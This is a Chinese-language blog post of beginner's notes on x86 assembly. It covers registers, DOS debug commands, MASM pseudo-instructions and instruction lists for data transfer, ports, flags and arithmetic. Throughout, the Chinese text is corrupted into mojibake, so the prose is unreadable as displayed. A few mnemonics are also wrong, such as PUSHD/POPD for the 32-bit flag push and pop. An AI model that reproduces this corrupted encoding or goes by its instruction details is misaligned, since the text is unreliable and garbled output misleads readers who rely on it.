<h3 id="å¯„å­˜å™¨"><a href="#å¯„å­˜å™¨" class="headerlink" title="å¯„å­˜å™¨"></a>å¯„å­˜å™¨</h3><h4 id="x86æ„æ¶ä¸‹"><a href="#x86æ„æ¶ä¸‹" class="headerlink" title="x86æ„æ¶ä¸‹"></a>x86æ„æ¶ä¸‹</h4><p><img src="/2020/10/17/2020-10-17-%E5%8B%87%E9%97%AF%E6%B1%87%E7%BC%96%E2%80%94%E2%80%94%E7%AC%94%E8%AE%B0/%E5%AF%84%E5%AD%98%E5%99%A8.jpg"></p>
<p>ï¼ˆå›¾ç‰‡æ¥æºäºå®‰å…¨å®¢ï¼Œæ°´å°ä¸Šä¹Ÿæœ‰å“ˆ~ï¼‰</p>
<p>32ä½x86æ¶æ„ä¸‹çš„å¯„å­˜å™¨å¯ä»¥è¢«ç®€å•åˆ†ä¸º<strong>é€šç”¨å¯„å­˜å™¨</strong>å’Œ<strong>ç‰¹æ®Šå¯„å­˜å™¨</strong>ä¸¤ç±»ï¼Œé€šç”¨å¯„å­˜å™¨åœ¨å¤§éƒ¨åˆ†æ±‡ç¼–æŒ‡ä»¤ä¸‹æ˜¯å¯ä»¥ä»»æ„ä½¿ç”¨çš„ï¼ˆè™½ç„¶æœ‰äº›æŒ‡ä»¤è§„å®šäº†æŸäº›å¯„å­˜å™¨çš„ç‰¹å®šç”¨é€”ï¼‰ï¼Œè€Œç‰¹æ®Šå¯„å­˜å™¨åªèƒ½è¢«ç‰¹å®šçš„æ±‡ç¼–æŒ‡ä»¤ä½¿ç”¨ï¼Œä¸èƒ½ç”¨æ¥ä»»æ„å­˜å‚¨æ•°æ®ã€‚</p>
<p>é€šç”¨å¯„å­˜å™¨åŒ…æ‹¬ä¸€èˆ¬å¯„å­˜å™¨ï¼ˆeaxã€ebxã€ecxã€edxï¼‰ï¼Œç´¢å¼•å¯„å­˜å™¨ï¼ˆesiã€ediï¼‰ï¼Œä»¥åŠå †æ ˆæŒ‡é’ˆå¯„å­˜å™¨ï¼ˆespã€ebpï¼‰</p>
<p>eax è¢«ç§°ä¸ºç´¯åŠ å¯„å­˜å™¨ï¼ˆ<strong>A</strong>ccumulatorï¼‰ï¼Œç”¨ä»¥è¿›è¡Œç®—æ•°è¿ç®—å’Œè¿”å›å‡½æ•°ç»“æœç­‰ã€‚ebx è¢«ç§°ä¸ºåŸºå€å¯„å­˜å™¨ï¼ˆ<strong>B</strong>aseï¼‰ï¼Œåœ¨å†…å­˜å¯»å€æ—¶ï¼ˆæ¯”å¦‚æ•°ç»„è¿ç®—ï¼‰ç”¨ä»¥å­˜æ”¾åŸºåœ°å€ã€‚ecx è¢«ç§°ä¸ºè®°æ•°å¯„å­˜å™¨ï¼ˆ<strong>C</strong>ounterï¼‰ï¼Œç”¨ä»¥åœ¨å¾ªç¯è¿‡ç¨‹ä¸­è®°æ•°ã€‚edx è¢«ç§°ä¸ºæ•°æ®å¯„å­˜å™¨ï¼ˆ<strong>D</strong>ataï¼‰ï¼Œå¸¸é…åˆ eax ä¸€èµ·å­˜æ”¾è¿ç®—ç»“æœç­‰æ•°æ®ã€‚</p>
<p>â€‹    ç´¢å¼•å¯„å­˜å™¨é€šå¸¸ç”¨äºå­—ç¬¦ä¸²æ“ä½œä¸­ï¼Œesi æŒ‡å‘è¦å¤„ç†çš„æ•°æ®åœ°å€ï¼ˆ<strong>S</strong>ource <strong>I</strong>ndexï¼‰ï¼Œedi æŒ‡å‘å­˜æ”¾å¤„ç†ç»“æœçš„æ•°æ®åœ°å€ï¼ˆ<strong>D</strong>estination <strong>I</strong>ndexï¼‰ã€‚</p>
<p>â€‹    å †æ ˆæŒ‡é’ˆå¯„å­˜å™¨ï¼ˆespã€ebpï¼‰ç”¨äºä¿å­˜å‡½æ•°åœ¨è°ƒç”¨æ ˆä¸­çš„çŠ¶æ€</p>
<p>ç‰¹æ®Šå¯„å­˜å™¨åŒ…æ‹¬æ®µåœ°å€å¯„å­˜å™¨ï¼ˆssã€csã€dsã€esã€fsã€gsï¼‰ï¼Œæ ‡å¿—ä½å¯„å­˜å™¨ï¼ˆEFLAGSï¼‰ï¼Œä»¥åŠæŒ‡ä»¤æŒ‡é’ˆå¯„å­˜å™¨ï¼ˆeipï¼‰</p>
<p>æ®µåœ°å€å¯„å­˜å™¨å°±æ˜¯ç”¨æ¥å­˜å‚¨å†…å­˜åˆ†æ®µåœ°å€çš„ï¼Œå…¶ä¸­å¯„å­˜å™¨ ss å­˜å‚¨å‡½æ•°è°ƒç”¨æ ˆï¼ˆ<strong>S</strong>tack <strong>S</strong>egmentï¼‰çš„åœ°å€ï¼Œå¯„å­˜å™¨ cs å­˜å‚¨ä»£ç æ®µï¼ˆ<strong>C</strong>ode <strong>S</strong>egmentï¼‰çš„åœ°å€ï¼Œå¯„å­˜å™¨ ds å­˜å‚¨æ•°æ®æ®µï¼ˆ<strong>D</strong>ata <strong>S</strong>egmentï¼‰çš„åœ°å€ï¼Œesã€fsã€gs æ˜¯é™„åŠ çš„å­˜å‚¨æ•°æ®æ®µåœ°å€çš„å¯„å­˜å™¨ã€‚</p>
<p>æ ‡å¿—ä½å¯„å­˜å™¨ï¼ˆEFLAGSï¼‰32ä½ä¸­çš„å¤§éƒ¨åˆ†è¢«ç”¨äºæ ‡å¿—æ•°æ®æˆ–ç¨‹åºçš„çŠ¶æ€ï¼Œä¾‹å¦‚ OFï¼ˆ<strong>O</strong>verflow <strong>F</strong>lagï¼‰å¯¹åº”æ•°å€¼æº¢å‡ºã€IFï¼ˆ<strong>I</strong>nterrupt <strong>F</strong>lagï¼‰å¯¹åº”ä¸­æ–­ã€ZFï¼ˆ<strong>Z</strong>ero <strong>F</strong>lagï¼‰å¯¹åº”è¿ç®—ç»“æœä¸º0ã€CFï¼ˆ<strong>C</strong>arry <strong>F</strong>lagï¼‰å¯¹åº”è¿ç®—äº§ç”Ÿè¿›ä½ç­‰ç­‰ã€‚</p>
<p>â€‹    æŒ‡ä»¤æŒ‡é’ˆå¯„å­˜å™¨ï¼ˆeipï¼‰å­˜å‚¨ä¸‹ä¸€æ¡è¿è¡ŒæŒ‡ä»¤çš„åœ°å€</p>
<p>å‚è€ƒï¼š</p>
<p>64ä½ç³»ç»Ÿä¸­å‡½æ•°ä¼ å‚ä½¿ç”¨çš„å¯„å­˜å™¨é¡ºåºæ˜¯RDI,RSI,RDX,RCX,R8,R9ä¹‹åæ‰æ˜¯ä½¿ç”¨æ ˆè¿›è¡Œå­˜å‚¨å‚æ•°</p>
<h2 id="æŒ‡ä»¤ï¼ˆå·¥å…·-debugï¼Œå…·ä½“é…ç½®å¯å‚è€ƒç™¾åº¦ï¼‰"><a href="#æŒ‡ä»¤ï¼ˆå·¥å…·-debugï¼Œå…·ä½“é…ç½®å¯å‚è€ƒç™¾åº¦ï¼‰" class="headerlink" title="æŒ‡ä»¤ï¼ˆå·¥å…·:debugï¼Œå…·ä½“é…ç½®å¯å‚è€ƒç™¾åº¦ï¼‰"></a>æŒ‡ä»¤ï¼ˆå·¥å…·:debugï¼Œå…·ä½“é…ç½®å¯å‚è€ƒç™¾åº¦ï¼‰</h2><p>ä¸€ã€Debugä½¿ç”¨</p>
<p>1ã€(å¸¸ç”¨æŒ‡ä»¤)RæŸ¥çœ‹ã€æ”¹å˜CPUå¯„å­˜å™¨çš„å†…å®¹ï¼›</p>
<p>DæŸ¥çœ‹å†…å­˜ä¸­çš„å†…å®¹ï¼›ï¼ˆd æ®µåœ°å€:åç§»åœ°å€ å¯ä»¥æŸ¥çœ‹ä»è¯¥æŒ‡å‘åœ°å€èµ·çš„128ä¸ªå­˜å‚¨å•å…ƒï¼Œè‹¥åœ¨å…¶åç»§ç»­è¾“å…¥dï¼Œå°†æ²¿ç€é¡ºåºæŸ¥çœ‹å‰©ä¸‹çš„å­˜å‚¨å•å…ƒï¼Œè‹¥åªæƒ³æŸ¥çœ‹å•ä¸ªï¼Œåˆ™åœ¨å‘½ä»¤åé¢åœ¨åŠ ä¸Šåç§»åœ°å€ï¼‰</p>
<p><strong>E æ®µåœ°å€:åç§»åœ°å€</strong> ï¼ˆ æ”¹å†™å†…å­˜ä¸­çš„å†…å®¹ï¼‰åæœ‰ä¸¤ç§æ–¹æ³•ï¼š</p>
<p>ï¼ˆ1ï¼‰æ˜¯ç›´æ¥åœ¨åé¢åŠ ä¸Šä¿®æ”¹çš„å­—æ¯æˆ–æ•°å­—</p>
<p>ï¼ˆ2ï¼‰æ˜¯å›è½¦é”®åï¼Œå†å¡«å†™ä¿®æ”¹çš„å­—æ¯æˆ–è€…æ•°å­—ï¼Œä½¿ç”¨æ­¤æ–¹æ³•æ—¶å¦‚æœç›´æ¥è¾“å…¥ç©ºæ ¼è¡¨ç¤ºä¸å¯¹æŸä¸ªæ•°æ®åšå‡ºä¿®æ”¹</p>
<p><strong>æ³¨ï¼šä¹Ÿå¯ä»¥é€šè¿‡ä»¥ä¸Šæ–¹å¼å°†æœºå™¨ç ï¼ˆæœ‰å¯¹åº”çš„æ±‡ç¼–æŒ‡ä»¤çš„æœºå™¨ç ï¼‰ç›´æ¥å†™å…¥å­˜å‚¨å•å…ƒ</strong></p>
<p>UæŒ‡ä»¤ï¼š<strong>U æ®µåœ°å€:åç§»åœ°å€</strong> å¯ä»¥æŸ¥çœ‹ä»æŒ‡å‘çš„ç‰©ç†åœ°å€ä½œä¸ºèµ·å§‹çš„ä¸€äº›å†…å­˜ä¸­çš„æœºå™¨æŒ‡ä»¤ï¼Œå¹¶å°†å†…å­˜ä¸­çš„æœºå™¨æŒ‡ä»¤ç¿»è¯‘æˆæ±‡ç¼–æŒ‡ä»¤ï¼›</p>
<p>TæŒ‡ä»¤ï¼šæ‰§è¡Œä¸€æ¡æœºå™¨æŒ‡ä»¤ï¼ˆåœ¨è¾“å…¥tæŒ‡ä»¤å‰ï¼Œéœ€è¦å…ˆæŠŠCS:IPæŒ‡å‘çš„ç‰©ç†åœ°å€æ”¹ä¸ºä½ è¦æ‰§è¡Œçš„ç‰©ç†åœ°å€ï¼Œç„¶åå†è¾“å…¥tï¼Œæ‰§è¡Œä¸€æ¡æœºå™¨æŒ‡ä»¤ï¼‰ï¼›</p>
<p>AæŒ‡ä»¤ï¼š <strong>A æ®µåœ°å€:åç§»åœ°å€</strong> å¯ä»¥ä»¥æ±‡ç¼–æŒ‡ä»¤çš„æ ¼å¼åœ¨å†…å­˜ä¸­å†™å…¥æœºå™¨æŒ‡ä»¤ï¼Œä¸å¿…åƒEæŒ‡ä»¤è¾“å…¥æœºå™¨ç ï¼Œæ›´åŠ ç®€å•æ–¹ä¾¿</p>
<p>PæŒ‡ä»¤ï¼šç”¨æ¥åœ¨int 21hå¤„æ‰§è¡Œï¼Œè¡¨ç¤ºç¨‹åºæ‰§è¡Œå®Œæˆï¼Œç¨‹åºè¿”å›åˆ°æœ€åˆè°ƒç”¨ç¨‹åºçš„åœ°æ–¹ï¼›ä¹Ÿå¯ä»¥ç”¨åœ¨loopå¾ªç¯å‰ï¼Œè®©ç¨‹åºè‡ªåŠ¨æ‰§è¡Œå¾ªç¯ç›´è‡³cxä¸­çš„å¾ªç¯æ¬¡æ•°ä¸º0</p>
<p>gæŒ‡ä»¤ï¼šåœ¨debugä¸Šè°ƒè¯•ç¨‹åºæ—¶ï¼Œ<strong>g åç§»åœ°å€</strong>å¯ä»¥è®©ç¨‹åºè‡ªåŠ¨æ‰§è¡Œåˆ°è¯¥å¤„çš„ç¨‹åºåœ°å€æ‰åœæ­¢ï¼Œå¹¶çœç•¥ä¸­é—´è¿‡ç¨‹ï¼Œç›´æ¥å±•ç¤ºæ‰§è¡Œåˆ°è¯¥å¤„çš„è¿è¡Œç»“æœ</p>
<p>å¦ï¼šæ‰€æœ‰å¡«å†™æ®µåœ°å€çš„åœ°æ–¹å¯ä»¥å¡«å†™æ®µå¯„å­˜å™¨ï¼Œè¡¨ç¤ºè¦å¯¹è¯¥æ®µå¯„å­˜å™¨åŠ åç§»åœ°å€æ‰€æŒ‡å‘çš„åœ°å€è¿›è¡Œæ“ä½œ</p>
<p>äºŒã€ä¼ªæŒ‡ä»¤</p>
<p>1ã€assumeï¼šå‡è®¾ã€‚å‡è®¾æŸä¸€æ®µå¯„å­˜å™¨å’Œç¨‹åºä¸­æŸä¸€ä¸ªç”¨segmentâ€¦endså®šä¹‰çš„æ®µç›¸å…³è”ã€‚ç¼–ç¨‹æ—¶è¦è®°å¾—ç”¨assumeå°†æœ‰ç‰¹å®šç”¨é€”çš„æ®µå’Œç›¸å…³çš„æ®µå¯„å­˜å™¨å…³è”èµ·æ¥å³å¯</p>
<p>2ã€æ®µå segment</p>
<p>â€‹            â€¦</p>
<p>â€‹      æ®µå ends  è¿™ä¸¤ä¸ªçš„ç»„åˆçš„æ˜¯å®šä¹‰ä¸€ä¸ªæ®µï¼Œæ®µå segmentè¯´æ˜ä¸€ä¸ªæ®µçš„å¼€å§‹ï¼Œæ®µå endsè¯´æ˜ä¸€ä¸ªæ®µçš„ç»“æŸ</p>
<p>3ã€endï¼šæ˜¯ä¸€ä¸ªæ±‡ç¼–ç¨‹åºç»“æŸçš„æ ‡è®°ã€‚å½“ç¼–è¯‘å™¨åœ¨ç¼–è¯‘æ±‡ç¼–ç¨‹åºçš„è¿‡ç¨‹ä¸­ï¼Œç¢°åˆ°ä¼ªæŒ‡ä»¤endå°±ç»“æŸå¯¹æºç¨‹åºçš„ç¼–è¯‘ã€‚æ³¨æ„ä¸endsçš„åŒºåˆ†ã€‚endæ˜¯æ•´ä¸ªæ±‡ç¼–ç¨‹åºçš„ç»“æŸï¼Œè€Œendsåªæ˜¯ä¸€ä¸ªå®šä¹‰æ®µçš„ç»“æŸ</p>
<p>4ã€MOV AX,4C00Hï¼ˆæˆ–è€…MOV AH,4CHï¼‰INT 21H    å¯ä»¥ä½¿å¾—ç¨‹åºè¿”å›ï¼Œåœ¨debugä¸­è°ƒè¯•æ—¶ï¼Œè¯¥æŒ‡ä»¤è¦ç”¨pæŒ‡ä»¤è¿è¡Œ</p>
<p>5ã€ç¼–å†™æºç¨‹åºæ—¶dwå³define word ï¼Œå®šä¹‰å­—ç±»å‹çš„æ•°æ®ã€‚å¹¶ä¸”æ•°æ®å°†ä¼šè¢«å­˜æ”¾åœ¨ä»¥cs:0ä½œä¸ºå¼€å§‹çš„å†…å­˜å•å…ƒ</p>
<p>6ã€ç¼–å†™æºç¨‹åºæ—¶ï¼Œå¦‚æœæœ‰å…¶ä»–çš„æ®µæˆ–æ•°æ®éœ€è¦æŒ‡å®šï¼Œé‚£ä¹ˆå°±å¿…é¡»è¦åœ¨çœŸæ­£è¿è¡Œçš„æŒ‡ä»¤å‰åŠ ä¸Š<strong>start:</strong> åŒæ—¶åŸæœ¬çš„endä¹Ÿè¦æ”¹æˆend start</p>
<p>7ã€ç¼–å†™æºç¨‹åºæ—¶ï¼Œå¯ä»¥å®šä¹‰å¤šä¸ªæ®µï¼Œæ¯ä¸ªæˆ‘ä»¬è‡ªå·±å®šä¹‰çš„æ®µåä»£è¡¨ç€è¿™ä¸ªæ®µçš„æ®µåœ°å€</p>
<h3 id="æ•°æ®ä¼ é€æŒ‡ä»¤ï¼ˆæ¥è‡ªç™¾åº¦ç™¾ç§‘ï¼‰"><a href="#æ•°æ®ä¼ é€æŒ‡ä»¤ï¼ˆæ¥è‡ªç™¾åº¦ç™¾ç§‘ï¼‰" class="headerlink" title="æ•°æ®ä¼ é€æŒ‡ä»¤ï¼ˆæ¥è‡ªç™¾åº¦ç™¾ç§‘ï¼‰"></a>æ•°æ®ä¼ é€æŒ‡ä»¤ï¼ˆæ¥è‡ªç™¾åº¦ç™¾ç§‘ï¼‰</h3><p>MOVï¼šä¼ é€å­—æˆ–å­—èŠ‚ã€‚</p>
<p>MOVSXï¼šå…ˆç¬¦å·æ‰©å±•ï¼Œå†ä¼ é€ã€‚</p>
<p>MOVZXï¼šå…ˆé›¶æ‰©å±•ï¼Œå†ä¼ é€ã€‚</p>
<p>PUSHï¼šæŠŠå­—å‹å…¥å †æ ˆã€‚</p>
<p>POPï¼š æŠŠå­—å¼¹å‡ºå †æ ˆã€‚</p>
<p>PUSHAï¼š æŠŠAXï¼ŒCXï¼ŒDXï¼ŒBXï¼ŒSPï¼ŒBPï¼ŒSIï¼ŒDIä¾æ¬¡å‹å…¥å †æ ˆã€‚</p>
<p>POPAï¼š æŠŠDIï¼ŒSIï¼ŒBPï¼ŒSPï¼ŒBXï¼ŒDXï¼ŒCXï¼ŒAXä¾æ¬¡å¼¹å‡ºå †æ ˆã€‚</p>
<p>PUSHADï¼š æŠŠEAXï¼ŒECXï¼ŒEDXï¼ŒEBXï¼ŒESPï¼ŒEBPï¼ŒESIï¼ŒEDIä¾æ¬¡å‹å…¥<a href="https://baike.baidu.com/item/%E5%A0%86%E6%A0%88">å †æ ˆ</a>ã€‚</p>
<p>POPADï¼š æŠŠEDIï¼ŒESIï¼ŒEBPï¼ŒESPï¼ŒEBXï¼ŒEDXï¼ŒECXï¼ŒEAXä¾æ¬¡å¼¹å‡º<a href="https://baike.baidu.com/item/%E5%A0%86%E6%A0%88">å †æ ˆ</a>ã€‚</p>
<p>BSWAPï¼š äº¤æ¢32ä½å¯„å­˜å™¨é‡Œå­—èŠ‚çš„é¡ºåºã€‚</p>
<p>XCHGï¼š äº¤æ¢å­—æˆ–å­—èŠ‚ã€‚( è‡³å°‘æœ‰ä¸€ä¸ª<a href="https://baike.baidu.com/item/%E6%93%8D%E4%BD%9C%E6%95%B0">æ“ä½œæ•°</a>ä¸ºå¯„å­˜å™¨,<a href="https://baike.baidu.com/item/%E6%AE%B5%E5%AF%84%E5%AD%98%E5%99%A8">æ®µå¯„å­˜å™¨</a>ä¸å¯ä½œä¸ºæ“ä½œæ•°)</p>
<p>CMPXCHGï¼š æ¯”è¾ƒå¹¶äº¤æ¢<a href="https://baike.baidu.com/item/%E6%93%8D%E4%BD%9C%E6%95%B0">æ“ä½œæ•°</a>ã€‚ï¼ˆç¬¬äºŒä¸ªæ“ä½œæ•°å¿…é¡»ä¸º<a href="https://baike.baidu.com/item/%E7%B4%AF%E5%8A%A0%E5%99%A8">ç´¯åŠ å™¨</a>AL/AX/EAXï¼‰</p>
<p>XADDï¼š å…ˆäº¤æ¢å†ç´¯åŠ ã€‚( ç»“æœåœ¨ç¬¬ä¸€ä¸ª<a href="https://baike.baidu.com/item/%E6%93%8D%E4%BD%9C%E6%95%B0">æ“ä½œæ•°</a>é‡Œ )</p>
<p>XLATï¼š å­—èŠ‚æŸ¥è¡¨è½¬æ¢â”€â”€ BX æŒ‡å‘ä¸€å¼  256 å­—èŠ‚çš„è¡¨çš„èµ·ç‚¹ï¼ŒAL ä¸ºè¡¨çš„ç´¢å¼•å€¼ï¼ˆ0-255ï¼Œå³0-FFHï¼‰ï¼› è¿”å› AL ä¸ºæŸ¥è¡¨ç»“æœ ï¼ˆ [BX+AL]-&gt;ALï¼‰</p>
<p>Enterçš„ä½œç”¨ç›¸å½“==push ebpå’Œmov ebp,esp</p>
<p>Leaveçš„ä½œç”¨ç›¸å½“==mov esp,ebpå’Œpop ebp</p>
<h3 id="è¾“å…¥è¾“å‡ºç«¯å£ä¼ é€æŒ‡ä»¤"><a href="#è¾“å…¥è¾“å‡ºç«¯å£ä¼ é€æŒ‡ä»¤" class="headerlink" title="è¾“å…¥è¾“å‡ºç«¯å£ä¼ é€æŒ‡ä»¤"></a>è¾“å…¥è¾“å‡ºç«¯å£ä¼ é€æŒ‡ä»¤</h3><p>INï¼š I/Oç«¯å£è¾“å…¥ã€‚ï¼ˆ è¯­æ³•ï¼šIN <a href="https://baike.baidu.com/item/%E7%B4%AF%E5%8A%A0%E5%99%A8">ç´¯åŠ å™¨</a>ï¼Œ{<a href="https://baike.baidu.com/item/%E7%AB%AF%E5%8F%A3%E5%8F%B7">ç«¯å£å·</a>â”‚DX} ï¼‰</p>
<p>OUTï¼š I/Oç«¯å£è¾“å‡º. ï¼ˆè¯­æ³•ï¼šOUT {ç«¯å£å·â”‚DX}ï¼Œ<a href="https://baike.baidu.com/item/%E7%B4%AF%E5%8A%A0%E5%99%A8">ç´¯åŠ å™¨</a>ï¼‰è¾“å…¥è¾“å‡ºç«¯å£ç”±ç«‹å³æ–¹å¼æŒ‡å®šæ—¶ï¼Œå…¶èŒƒå›´æ˜¯ 0-255ï¼›ç”±å¯„å­˜å™¨DX æŒ‡å®šæ—¶ï¼Œå…¶èŒƒå›´æ˜¯ 0-65535ã€‚ [6] </p>
<h3 id="ç›®çš„åœ°å€ä¼ é€æŒ‡ä»¤"><a href="#ç›®çš„åœ°å€ä¼ é€æŒ‡ä»¤" class="headerlink" title="ç›®çš„åœ°å€ä¼ é€æŒ‡ä»¤"></a>ç›®çš„åœ°å€ä¼ é€æŒ‡ä»¤</h3><p>LEAï¼š è£…å…¥<a href="https://baike.baidu.com/item/%E6%9C%89%E6%95%88%E5%9C%B0%E5%9D%80">æœ‰æ•ˆåœ°å€</a>ã€‚ä¾‹ï¼šLEA DXï¼Œstringï¼›æŠŠ<a href="https://baike.baidu.com/item/%E5%81%8F%E7%A7%BB%E5%9C%B0%E5%9D%80">åç§»åœ°å€</a>å­˜åˆ°DXã€‚</p>
<p>LDSï¼š ä¼ é€ç›®æ ‡<a href="https://baike.baidu.com/item/%E6%8C%87%E9%92%88">æŒ‡é’ˆ</a>ï¼ŒæŠŠæŒ‡é’ˆå†…å®¹è£…å…¥DSã€‚ä¾‹ï¼š LDS SIï¼Œstringï¼›æŠŠ<a href="https://baike.baidu.com/item/%E6%AE%B5%E5%9C%B0%E5%9D%80">æ®µåœ°å€</a>ï¼š<a href="https://baike.baidu.com/item/%E5%81%8F%E7%A7%BB%E5%9C%B0%E5%9D%80">åç§»åœ°å€</a>å­˜åˆ°DSï¼šSIã€‚</p>
<p>LESï¼š ä¼ é€ç›®æ ‡<a href="https://baike.baidu.com/item/%E6%8C%87%E9%92%88">æŒ‡é’ˆ</a>ï¼ŒæŠŠæŒ‡é’ˆå†…å®¹è£…å…¥ESã€‚ä¾‹ï¼š LES DIï¼Œstringï¼›æŠŠ<a href="https://baike.baidu.com/item/%E6%AE%B5%E5%9C%B0%E5%9D%80">æ®µåœ°å€</a>ï¼š<a href="https://baike.baidu.com/item/%E5%81%8F%E7%A7%BB%E5%9C%B0%E5%9D%80">åç§»åœ°å€</a>å­˜åˆ°ESï¼šDIã€‚</p>
<p>LFSï¼š ä¼ é€ç›®æ ‡<a href="https://baike.baidu.com/item/%E6%8C%87%E9%92%88">æŒ‡é’ˆ</a>ï¼ŒæŠŠæŒ‡é’ˆå†…å®¹è£…å…¥FSã€‚ä¾‹ï¼š LFS DIï¼Œstringï¼›æŠŠ<a href="https://baike.baidu.com/item/%E6%AE%B5%E5%9C%B0%E5%9D%80">æ®µåœ°å€</a>ï¼š<a href="https://baike.baidu.com/item/%E5%81%8F%E7%A7%BB%E5%9C%B0%E5%9D%80">åç§»åœ°å€</a>å­˜åˆ°FSï¼šDIã€‚</p>
<p>LGSï¼š ä¼ é€ç›®æ ‡<a href="https://baike.baidu.com/item/%E6%8C%87%E9%92%88">æŒ‡é’ˆ</a>ï¼ŒæŠŠæŒ‡é’ˆå†…å®¹è£…å…¥GSã€‚ä¾‹ï¼š LGS DIï¼Œstringï¼›æŠŠ<a href="https://baike.baidu.com/item/%E6%AE%B5%E5%9C%B0%E5%9D%80">æ®µåœ°å€</a>ï¼š<a href="https://baike.baidu.com/item/%E5%81%8F%E7%A7%BB%E5%9C%B0%E5%9D%80">åç§»åœ°å€</a>å­˜åˆ°GSï¼šDIã€‚</p>
<p>LSSï¼š ä¼ é€ç›®æ ‡<a href="https://baike.baidu.com/item/%E6%8C%87%E9%92%88">æŒ‡é’ˆ</a>ï¼ŒæŠŠæŒ‡é’ˆå†…å®¹è£…å…¥SSã€‚ä¾‹ï¼š LSS DIï¼Œstringï¼›æŠŠ<a href="https://baike.baidu.com/item/%E6%AE%B5%E5%9C%B0%E5%9D%80">æ®µåœ°å€</a>ï¼š<a href="https://baike.baidu.com/item/%E5%81%8F%E7%A7%BB%E5%9C%B0%E5%9D%80">åç§»åœ°å€</a>å­˜åˆ°SSï¼šDIã€‚</p>
<h3 id="æ ‡å¿—ä¼ é€æŒ‡ä»¤"><a href="#æ ‡å¿—ä¼ é€æŒ‡ä»¤" class="headerlink" title="æ ‡å¿—ä¼ é€æŒ‡ä»¤"></a>æ ‡å¿—ä¼ é€æŒ‡ä»¤</h3><p>LAHFï¼šæ ‡å¿—å¯„å­˜å™¨ä¼ é€ï¼ŒæŠŠæ ‡å¿—è£…å…¥AHã€‚</p>
<p>SAHFï¼š <a href="https://baike.baidu.com/item/%E6%A0%87%E5%BF%97%E5%AF%84%E5%AD%98%E5%99%A8">æ ‡å¿—å¯„å­˜å™¨</a>ä¼ é€ï¼ŒæŠŠAHå†…å®¹è£…å…¥æ ‡å¿—å¯„å­˜å™¨ã€‚</p>
<p>PUSHFï¼š æ ‡å¿—<a href="https://baike.baidu.com/item/%E5%85%A5%E6%A0%88/12688157">å…¥æ ˆ</a>ã€‚</p>
<p>POPFï¼š æ ‡å¿—<a href="https://baike.baidu.com/item/%E5%87%BA%E6%A0%88">å‡ºæ ˆ</a>ã€‚</p>
<p>PUSHDï¼š 32ä½æ ‡å¿—<a href="https://baike.baidu.com/item/%E5%85%A5%E6%A0%88/12688157">å…¥æ ˆ</a>ã€‚</p>
<p>POPDï¼š 32ä½æ ‡å¿—<a href="https://baike.baidu.com/item/%E5%87%BA%E6%A0%88">å‡ºæ ˆ</a>ã€‚</p>
<h2 id="ç®—æœ¯è¿ç®—æŒ‡ä»¤"><a href="#ç®—æœ¯è¿ç®—æŒ‡ä»¤" class="headerlink" title="ç®—æœ¯è¿ç®—æŒ‡ä»¤"></a>ç®—æœ¯è¿ç®—æŒ‡ä»¤</h2><p>ç®—æ•°è¿ç®—ç±»æŒ‡ä»¤åŒ…æ‹¬åŠ å‡ä¹˜é™¤ã€æ¯”è¾ƒä¸è°ƒæ•´æŒ‡ä»¤ã€‚å®ƒä»¬å¯è¿›è¡Œ8ä½ã€16ä½å’Œ32ä½çš„è¿ç®—ã€‚å‚åŠ è¿ç®—çš„æ“ä½œæ•°å¯ä»¥è¯´äºŒè¿›åˆ¶æ•°å’Œåè¿›åˆ¶æ•°ï¼ˆBCDç ï¼‰ï¼Œè¿™äº›æ•°å¯ä»¥æ˜¯æ— ç¬¦å·æ•°ï¼Œä¹Ÿå¯ä»¥æ˜¯å¸¦ç¬¦å·æ•°ã€‚ç®—æœ¯è¿ç®—æŒ‡ä»¤çš„ä¸»è¦ç‰¹ç‚¹æ˜¯æ‰§è¡Œç»“æœå½±å“æ ‡å¿—å¯„å­˜å™¨çš„çŠ¶æ€æ ‡å¿—ä½OFã€SFã€ZFã€AFã€PFã€CFã€‚</p>
<p>ADDï¼š åŠ æ³•ã€‚</p>
<p>ADCï¼š å¸¦è¿›ä½åŠ æ³•ã€‚</p>
<p>INCï¼š åŠ  1ã€‚</p>
<p>AAAï¼š åŠ æ³•çš„<a href="https://baike.baidu.com/item/ASCII%E7%A0%81/4607931">ASCIIç </a>è°ƒæ•´ã€‚</p>
<p>DAAï¼š åŠ æ³•çš„åè¿›åˆ¶è°ƒæ•´ã€‚</p>
<p>SUBï¼š å‡æ³•ã€‚</p>
<p>SBBï¼š å¸¦å€Ÿä½å‡æ³•ã€‚</p>
<p>DECï¼š å‡ 1ã€‚</p>
<p>NEGï¼š å–è¡¥ã€‚</p>
<p>CMPï¼š æ¯”è¾ƒã€‚ï¼ˆä¸¤<a href="https://baike.baidu.com/item/%E6%93%8D%E4%BD%9C%E6%95%B0">æ“ä½œæ•°</a>ä½œå‡æ³•ï¼Œä»…ä¿®æ”¹æ ‡å¿—ä½ï¼Œä¸å›é€ç»“æœï¼‰</p>
<p>AASï¼š å‡æ³•çš„<a href="https://baike.baidu.com/item/ASCII%E7%A0%81/4607931">ASCIIç </a>è°ƒæ•´ã€‚</p>
<p>DASï¼š å‡æ³•çš„åè¿›åˆ¶è°ƒæ•´ã€‚</p>
<p>MULï¼š æ— ç¬¦å·ä¹˜æ³•ã€‚ç»“æœå›é€AHå’ŒALï¼ˆå­—èŠ‚è¿ç®—ï¼‰ï¼Œæˆ–DXå’ŒAXï¼ˆå­—è¿ç®—ï¼‰</p>
<p>IMULï¼š æ•´æ•°ä¹˜æ³•ã€‚ç»“æœå›é€AHå’ŒALï¼ˆå­—èŠ‚è¿ç®—ï¼‰ï¼Œæˆ–DXå’ŒAXï¼ˆå­—è¿ç®—ï¼‰</p>
<p>AAMï¼š ä¹˜æ³•çš„ASCIIç è°ƒæ•´ã€‚</p>
<p>DIVï¼š æ— ç¬¦å·é™¤æ³•ï¼šå•†å›é€ALï¼Œä½™æ•°å›é€AHï¼Œï¼ˆå­—èŠ‚è¿ç®—ï¼‰ï¼›æˆ–å•†å›é€AXï¼Œä½™æ•°å›é€DXï¼ˆå­—è¿ç®—ï¼‰</p>
<p>IDIVï¼š æ•´æ•°é™¤æ³•ï¼šå•†å›é€ALï¼Œä½™æ•°å›é€AHï¼Œï¼ˆå­—èŠ‚è¿ç®—ï¼‰ï¼›æˆ–å•†å›é€AXï¼Œä½™æ•°å›é€DXï¼ˆå­—è¿ç®—ï¼‰</p>
<p>AADï¼š é™¤æ³•çš„<a href="https://baike.baidu.com/item/ASCII%E7%A0%81/4607931">ASCIIç </a>è°ƒæ•´ã€‚</p>
<p>CBWï¼š å­—èŠ‚è½¬æ¢ä¸ºå­—ã€‚ï¼ˆæŠŠALä¸­å­—èŠ‚çš„ç¬¦å·æ‰©å±•åˆ°AHä¸­å»ï¼‰</p>
